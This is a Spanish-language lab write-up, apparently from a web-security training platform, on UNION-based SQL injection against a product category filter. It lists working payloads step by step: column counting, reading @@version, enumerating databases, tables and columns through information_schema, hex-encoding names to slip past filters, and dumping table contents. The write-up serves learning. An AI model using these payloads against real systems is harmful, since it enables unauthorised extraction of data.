En esta clase aplicamos una inyección SQL con UNION para extraer la versión del motor de base de datos, esta vez sobre sistemas como MySQL o Microsoft SQL Server.

La vulnerabilidad está en el filtro de categoría de productos. Al interceptar la solicitud y modificar el parámetro ‘category’, podemos inyectar una consulta adicional que devuelva el valor del sistema.

El proceso consiste en:

- Interceptar la solicitud con Burp Suite y probar distintas combinaciones hasta determinar el número de columnas que devuelve la consulta y cuáles aceptan texto. En este caso, son dos columnas de texto.
- Una vez identificadas, se usa la función ‘**@@version**‘, propia de MySQL y SQL Server, para extraer información del motor y su versión.
- El símbolo ‘**#**‘ se utiliza como comentario para anular el resto de la consulta original.

Esta técnica demuestra cómo, con una inyección bien construida, es posible reconocer el entorno sin necesidad de credenciales o acceso especial.

**Quédate con esto**: Conocer el motor de base de datos desde fuera es el primer paso para afinar futuras inyecciones y adaptar payloads según el sistema objetivo.

![Pasted_image_20250702150520.png](/Imagenes/Pasted_image_20250702150520.png)
Solucion
Primero visualizar cuantas columnas hay ' order by (el numero de mayor a menor)
![Pasted_image_20250702151029.png](/Imagenes/Pasted_image_20250702151029.png)
luego toca jugar con union select para visualizar la version ' union select 1,@@version-- -
![Pasted_image_20250702151254.png](/Imagenes/Pasted_image_20250702151254.png)
despues para enumerar las bases de datos ponemos lo siguiente ' union select 1,schema_name from information_schema.schemata-- -
![Pasted_image_20250702151806.png](/Imagenes/Pasted_image_20250702151806.png)
en caso de que diera error es por que puede ser que tenga mucha informacion por lo que tenemos que poner limites
' union select 1,schema_name from information_schema.schemata limit 0,1-- - y tocaria jugar con el primer numero para que nos empiece a enumerar las BD (importante en esto se hiso con pets necesitamos quitarlo para que iterara por todos los pots)
![Pasted_image_20250702152205.png](/Imagenes/Pasted_image_20250702152205.png)
y para enumerar las tablas en una unica base de datos ' union select NULL,group_concat(schema_name) from information_schema.schemata-- - y modificamos con group concat para que no la mueste todas y quitar limit
![Pasted_image_20250702153247.png](/Imagenes/Pasted_image_20250702153247.png)
entonces para mostrar todas las tablas lo mejor seria utilizar un peticion con GET
![Pasted_image_20250702153757.png](/Imagenes/Pasted_image_20250702153757.png)y para que sea para una BD en especifico ponemos lo siguiente ' union select NULL,table_name from information_schema.tables where table_schema="academy_labs"-- -
![Pasted_image_20250702154236.png](/Imagenes/Pasted_image_20250702154236.png)
en caso de que no funcione por temas de sanitizacion podemos probar con la cadena en hexadecimal
![Pasted_image_20250702154431.png](/Imagenes/Pasted_image_20250702154431.png)
y esto lo ponemos siempre poniendo primero 0x (0x61636164656d795f6c616273) obtenemos el mismo resultado
![Pasted_image_20250702154810.png](/Imagenes/Pasted_image_20250702154810.png)
ahora si quisieramos enumerar las columnas ' union select NULL,column_name from information_schema.columns where table_schema=0x61636164656d795f6c616273 and table_name='products'-- -
![Pasted_image_20250702155107.png](/Imagenes/Pasted_image_20250702155107.png)
En caso de que no mostrar todos los datos hay que jugar con group_concat
' union select NULL,group_concat(column_name) from information_schema.columns where table_schema=0x61636164656d795f6c616273 and table_name='products'-- -
![Pasted_image_20250702155401.png](/Imagenes/Pasted_image_20250702155401.png)
y para mostar los datos de la tabla ' union select NULL,group_concat(category,':') from academy_labs.products-- -
![Pasted_image_20250702160100.png](/Imagenes/Pasted_image_20250702160100.png)
